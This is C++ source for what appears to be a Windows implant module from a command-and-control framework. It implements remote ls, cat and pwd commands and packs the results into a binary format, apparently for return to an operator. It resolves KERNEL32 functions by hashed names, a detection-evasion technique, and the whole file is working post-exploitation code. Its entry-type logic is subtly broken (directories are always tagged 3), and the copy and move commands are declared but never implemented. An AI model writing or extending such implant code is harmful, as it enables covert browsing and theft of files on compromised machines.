#include "common.h"

#define DO_LS  1
#define DO_CP  2
#define DO_PWD 3
#define DO_CAT 4
#define DO_MV  5



typedef HANDLE(WINAPI *pFindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFIleData);
typedef BOOL(WINAPI *pFindNextFileA)(HANDLE lpFindFile, LPWIN32_FIND_DATAA lpFindFIleData);
typedef DWORD(WINAPI *pGetFullPathNameA)(LPCSTR lpFileName, DWORD nBufferLenght, LPCSTR lpBuffer, LPCSTR *lpFilePart);
typedef DWORD(WINAPI *pGetFileAttributesA)(LPCSTR lpFileName);
typedef DWORD(WINAPI *pGetLastError)();
typedef BOOL(WINAPI *pCloseHandle)(HANDLE hObject);
typedef BOOL(WINAPI* pReadFile)(HANDLE hFile, LPVOID Buffer, DWORD NumberOfBytesToRead, LPDWORD NumberOfBytesRead, LPOVERLAPPED Overlapped);
typedef HANDLE(WINAPI* pCreateFileA)(LPCSTR FileName, DWORD desired, DWORD Shared, LPSECURITY_ATTRIBUTES lpSecAttrs, DWORD CreateDispo, DWORD FlagsAndAttrs, HANDLE Template);
typedef DWORD(WINAPI* pGetCurrentDirectoryA)(DWORD BufferLen, LPSTR lpBuffer);

SEC_B void do_ls(PModule mod) {
	auto Dirlen = mod->ModuleUnpack4();
	PBYTE Dir = mod->ModuleUnpackBytes(Dirlen);

	HMODULE k32 = mod->ModuleGetModule(HASH_STRW( L"KERNEL32.DLL" ) );
	pGetFullPathNameA fnGetFullPathNameA     = ( pGetFullPathNameA   )mod->ModuleGetProcAddress( k32, HASH_STRA( "GetFullPathNameA"   ) );
	pGetFileAttributesA fnGetFileAttributesA = ( pGetFileAttributesA )mod->ModuleGetProcAddress( k32, HASH_STRA( "GetFileAttributesA" ) );
	pFindFirstFileA fnFindFirstFileA         = ( pFindFirstFileA     )mod->ModuleGetProcAddress( k32, HASH_STRA( "FindFirstFileA"     ) );
	pFindNextFileA fnFindNextFileA           = ( pFindNextFileA      )mod->ModuleGetProcAddress( k32, HASH_STRA( "FindNextFileA"      ) );
	pCloseHandle fnCloseHandle               = ( pCloseHandle        )mod->ModuleGetProcAddress( k32, HASH_STRA( "CloseHandle"        ) );
	pGetLastError fnGetLastError             = ( pGetLastError       )mod->ModuleGetProcAddress( k32, HASH_STRA( "GetLastError"       ) );

	CHAR path[MAX_PATH] = { 0 };
	DWORD PathSize = fnGetFullPathNameA((PCHAR)Dir, MAX_PATH, path, NULL);
	DWORD Attrs = fnGetFileAttributesA((PCHAR)Dir);
	BOOL isFile = (Attrs != INVALID_FILE_ATTRIBUTES) && !(Attrs & FILE_ATTRIBUTE_DIRECTORY);
	if (!isFile) {
		path[ PathSize   ] = '\\';
		path[ ++PathSize ] = '*';
		path[ ++PathSize ] = '\0';
	}

	WIN32_FIND_DATAA fData = { 0 };
	HANDLE hFind = fnFindFirstFileA( path, &fData );
	if ( !hFind || hFind == INVALID_HANDLE_VALUE ) {
		mod->ModulePack4( OUTPUT_ERROR );
		mod->ModulePack4( ( INT32 )fnGetLastError( ));
		return;
	}

	DWORD EntryType = 0;
	CHAR dot1[3];
	char dot2[2];

	mod->ModulePack4(OUTPUT_NEEDS_PARSE);
	mod->ModulePack4(PARSER_LS);

	dot1[0] = '.';
	dot1[1] = '.';
	dot1[2] = '\0';

	dot2[0] = '.';
	dot2[1] = '\0';

	do {
		if (pStrcmp(fData.cFileName, dot1) == 0 || pStrcmp(fData.cFileName, dot2) == 0) { continue; }

		if (fData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { EntryType = 1; }
		if (fData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) { EntryType = 3; }
		else { EntryType = 3; }

		INT32 Len = (INT32)pStrlen(fData.cFileName);
		mod->ModulePack4(Len);
		mod->ModulePackBytes((PBYTE)fData.cFileName, Len);
		mod->ModulePack4(EntryType);
		ULONGLONG size = ((ULONGLONG)fData.nFileSizeHigh << 32) | fData.nFileSizeLow;
		mod->ModulePack8((INT64)size);

	} while (fnFindNextFileA(hFind, &fData));
	mod->ModulePack4(END_SIG);

	fnCloseHandle(hFind);
	mod->ModuleFreeMem(Dir);
	return;
}


SEC_B void do_cat(PModule mod) {
	BOOL res        = FALSE;
	BOOL isFile     = FALSE;
	CHAR buf[2048] = { 0 };
	DWORD ChunkSize = 2048;
	DWORD BytesRead = 0;
	DWORD Attrs     = 0;
	HANDLE hFile    = NULL;


	auto Dirlen = mod->ModuleUnpack4();
	PBYTE file = mod->ModuleUnpackBytes(Dirlen);

	HMODULE k32 = mod->ModuleGetModule(HASH_STRW( L"KERNEL32.DLL" ) );


	pGetFileAttributesA fnGetFileAttributesA = ( pGetFileAttributesA )mod->ModuleGetProcAddress( k32, HASH_STRA( "GetFileAttributesA" ) );
	pGetFullPathNameA fnGetFullPathNameA     = ( pGetFullPathNameA   )mod->ModuleGetProcAddress( k32, HASH_STRA( "GetFullPathNameA"   ) );


	CHAR path[MAX_PATH] = { 0 };
	DWORD PathSize = fnGetFullPathNameA((PCHAR)file, MAX_PATH, path, NULL);
	Attrs = fnGetFileAttributesA((PCHAR)file);
	isFile = (Attrs != INVALID_FILE_ATTRIBUTES && !(Attrs & FILE_ATTRIBUTE_DIRECTORY));
	if (!isFile) {
		mod->ModulePack4( OUTPUT_ERROR );
		mod->ModulePack4( CAT_ERROR_NOT_FILE);
		return;
	}

	pCreateFileA fnCreateFileA     = ( pCreateFileA        )mod->ModuleGetProcAddress( k32, HASH_STRA( "CreateFileA"        ) );
	pReadFile fnReadFile          = ( pReadFile           )mod->ModuleGetProcAddress( k32, HASH_STRA( "ReadFile"           ) );
	pCloseHandle fnCloseHandle    = ( pCloseHandle        )mod->ModuleGetProcAddress( k32, HASH_STRA( "CloseHandle"        ) );
	pGetLastError fnGetLastError  = ( pGetLastError       )mod->ModuleGetProcAddress( k32, HASH_STRA( "GetLastError"       ) );



	hFile = fnCreateFileA((PCHAR)path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		mod->ModulePack4( OUTPUT_ERROR );
		mod->ModulePack4( ( INT32 )fnGetLastError( ));
		return;
	}

	
	res = fnReadFile(hFile, buf, ChunkSize, &BytesRead, NULL);
	if (!res) {
		mod->ModulePack4( OUTPUT_ERROR );
		mod->ModulePack4( ( INT32 )fnGetLastError( ));
		return;
	}

	mod->ModulePack4(OUTPUT_NO_PARSE);
	mod->ModulePack4(BytesRead);
	mod->ModulePackBytes((PBYTE)buf, BytesRead);
	mod->ModuleFreeMem(file);
	fnCloseHandle(hFile);

	return;



}


SEC_B void do_pwd(PModule mod) {
	HMODULE k32 = mod->ModuleGetModule( HASH_STRW( L"KERNEL32.DLL" ) );
	pGetCurrentDirectoryA fnGetCurrentDirectoryA  = ( pGetCurrentDirectoryA )mod->ModuleGetProcAddress( k32, HASH_STRA( "GetCurrentDirectoryA" ) );
	pGetLastError fnGetLastError                  = ( pGetLastError         )mod->ModuleGetProcAddress( k32, HASH_STRA( "GetLastError"         ) );


	DWORD size = fnGetCurrentDirectoryA( 0, NULL );

	PBYTE pwd = (PBYTE)mod->ModuleAllocate( size );

	DWORD res = fnGetCurrentDirectoryA( size, ( PCHAR )pwd );
	if( res == 0 || res >= size ) {
		mod->ModuleFreeMem( pwd );
		mod->ModulePack4( OUTPUT_ERROR );
		mod->ModulePack4( ( INT32 )fnGetLastError( ));
		return;
	} 

	mod->ModulePack4(OUTPUT_NO_PARSE);
	mod->ModulePack4( ( INT32 )res );
	mod->ModulePackBytes(pwd, ( INT32 )res);
}


/*
	by the time we call into run, binary format will hold the args, each func just reads what it needs
*/


 extern "C" SEC_B void run(PModule mod, INT32 CommandCode) {

	switch (CommandCode) {
	case DO_LS:
		do_ls(mod);
		break;
	case DO_CAT:
		do_cat(mod);
		break;
	case DO_PWD:
		do_pwd(mod);
		break;
	}
	return;
}